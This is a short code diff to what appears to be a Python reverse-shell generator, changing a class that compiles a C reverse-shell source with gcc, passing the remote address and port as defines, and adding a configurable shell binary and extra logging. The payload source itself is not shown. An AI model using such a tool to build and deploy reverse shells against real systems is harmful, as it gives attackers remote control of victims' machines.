@@ -21,18 +21,22 @@ class Shell:
 
 
 class C(Shell):
-    def __init__(self, address: str, port: int):
+    def __init__(self, address: str, port: int, shell: str):
         Shell.__init__(self, address=address, port=port)
+        self.shell = shell
 
     def generate_reverse_shell(self):
         self.validate()
 
+        shell = "\"%s\"" % self.shell
         port = self.port
         address = "\"%s\"" % self.address
         path = os.path.join(get_path(), 'shell.c')
-        logger.debug("compiling with arguments: %s %s %s", path, address, port)
-        pipe = Popen(["gcc", path, "-o", "shell", "-DREMOTE_ADDR=%s" % address, "-DREMOTE_PORT=%s" % port,
-                      "-Wno-implicit-function-declaration"])
+        logger.debug("compiling: %s -DREMOTE_ADDR=%s -DREMOTE_PORT=%s -DSHELL=%s", path, address, port, shell)
+        pipe = Popen(
+            ["gcc", path, "-o", "shell", "-DREMOTE_ADDR=%s" % address, "-DREMOTE_PORT=%s" % port, "-DSHELL=%s" % shell,
+             "-Wno-implicit-function-declaration"])
+        logger.info(pipe.stdout)
 
     def validate(self):
         if self.address is None:
